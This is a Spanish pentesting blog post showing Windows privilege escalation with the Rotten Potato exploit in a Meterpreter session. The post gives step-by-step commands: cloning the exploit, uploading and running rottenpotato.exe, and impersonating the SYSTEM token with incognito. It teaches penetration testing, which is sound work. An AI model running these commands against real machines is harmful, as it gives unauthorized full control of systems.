---
title: "Escalar privilegios con Rotten Potato en entornos Windows"
description: "Cuando se logra acceder al sistema el siguiente objetivo es escalar privilegios para comprometer la totalidad del sistema convirtiéndose en una tarea complicada. Obteniendo rol…"
pubDate: 2018-04-14
updatedDate: 2018-04-15
author: "Miguel Zabala"
tags: ["Pentesting"]
legacyUrl: "https://nullsectorblog.co/escalando-privilegios-con-rotten-potato-en-entornos-windows/"
---
Cuando se logra acceder al sistema el siguiente objetivo es escalar privilegios para comprometer la totalidad del sistema convirtiéndose en una tarea complicada.

![Escalar privilegios con Rotten Potato en entornos Windows](/investigacion/escalando-privilegios-con-rotten-potato-en-entornos-windows/potato.png)

## Obteniendo rol administrador en una shell con privilegios limitados

**1 –** Para este ejemplo tenemos una maquina con windows 10 con un shell limitada, primero evidenciamos que el usuario que este activo la shell.

getuid

![](/investigacion/escalando-privilegios-con-rotten-potato-en-entornos-windows/Escalada-de-privilegios.png)

**2 –** Evidenciamos que los permisos que tiene el usuario actual son limitados y restringen la ejecución de comandos

getprivs

![](/investigacion/escalando-privilegios-con-rotten-potato-en-entornos-windows/Escalada-de-privilegios2.png)

3 – Intentamos elevar los privilegios con el confiable «**getsystem**» en el meterpreter (en este caso no resulta exitoso).

getsystem

![](/investigacion/escalando-privilegios-con-rotten-potato-en-entornos-windows/Escalada-de-privilegios3.png)

**4 –**  Descargamos nuestro exploit desde github para proceder a cargarlo en nuestra maquina comprometida

git clone https://github.com/foxglovesec/RottenPotato.git

![](/investigacion/escalando-privilegios-con-rotten-potato-en-entornos-windows/Escalada-de-privilegios5.png)

**5 –**  Buscamos en el directorio que recién descargamos, nuestro exploit estará como «**rottenpotato.exe»**

cd RottenPotato
ls

![](/investigacion/escalando-privilegios-con-rotten-potato-en-entornos-windows/Escalada-de-privilegios6.png)

**6 –** Nos ubicamos en un directorio en el cual tengamos permisos de escritura en este caso lo subiremos a **Public**

cd C:\\\\Users\\\\Public
pwd

![](/investigacion/escalando-privilegios-con-rotten-potato-en-entornos-windows/Escalada-de-privilegios4.png)

**7 –**  Ejecutamos la subida del archivo, podemos subirlo de diferentes maneras (FTP o Share) en este caso con **upload** del meterpreter basta

upload /root/RottenPotato/rottenpotato.exe

![](/investigacion/escalando-privilegios-con-rotten-potato-en-entornos-windows/Escalada-de-privilegios7.png)

**8-** Primero debemos cargar el modulo incógnito para la impersonalizaron de tokens

use incognito

![](/investigacion/escalando-privilegios-con-rotten-potato-en-entornos-windows/Escalada-de-privilegios8.png)

**9 –**  Ahora identificamos los tokens que tiene disponible el usuario que tenemos comprometido actualmente, en este caso no tenemos ninguno

list\_tokens -u

![](/investigacion/escalando-privilegios-con-rotten-potato-en-entornos-windows/Escalada-de-privilegios9.png)

**10 –** Ejecutamos nuestra papa podrida para que la magia suceda

execute -Hc -f ./rottenpotato.exe

![](/investigacion/escalando-privilegios-con-rotten-potato-en-entornos-windows/Escalada-de-privilegios10.png)

**11 –** Después de ejecutado, volvemos a verificar los tokens que tenemos a nuestro alcance

list\_tokens -u

![](/investigacion/escalando-privilegios-con-rotten-potato-en-entornos-windows/Escalada-de-privilegios11.png)

**12 –** Ahora que tenemos el token disponible procedemos a personificar a el administrador del sistema

impersonate\_token "NT AUTHORITY\\\\SYSTEM"

![](/investigacion/escalando-privilegios-con-rotten-potato-en-entornos-windows/Escalada-de-privilegios12.png)

**13 –** Magia! por ultimo nos queda verificar el usuario activo en la sesión que tenemos abierta.

[![](/investigacion/escalando-privilegios-con-rotten-potato-en-entornos-windows/Escalada-de-privilegios13-1.png)](https://nullsector.co/wp-content/uploads/2018/04/Escalada-de-privilegios13-1.png)

Así de útil puede ser este método para escalar privilegios en Windows, Recuerda utilizar esta información sabiamente.

Gracias a los grandes Stephen Breen y Chris Mallz nos facilitaran las cosas en la fase de post-explotacion!.

**Fuente Original: [Fox Love Security](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)**

saludos!

**0x00Sector!!**
